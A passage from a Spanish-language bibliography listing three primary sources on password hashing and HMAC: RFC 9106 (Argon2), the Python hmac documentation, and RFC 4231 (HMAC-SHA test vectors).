4. **[PRIMARIA]** Biryukov, A., Dinu, D., Khovratovich, D. y Josefsson, S. (2021). *Argon2 memory-hard function for password hashing and proof-of-work applications* (RFC 9106). IETF. https://www.rfc-editor.org/rfc/rfc9106
5. **[PRIMARIA]** Python Software Foundation. (s. f.). *hmac — Keyed-hashing for message authentication*. Documentación de Python 3. https://docs.python.org/3/library/hmac.html
6. **[PRIMARIA]** Nyström, M. (2005). *Identifiers and test vectors for HMAC-SHA-224, HMAC-SHA-256, HMAC-SHA-384, and HMAC-SHA-512* (RFC 4231). IETF. https://www.rfc-editor.org/rfc/rfc4231
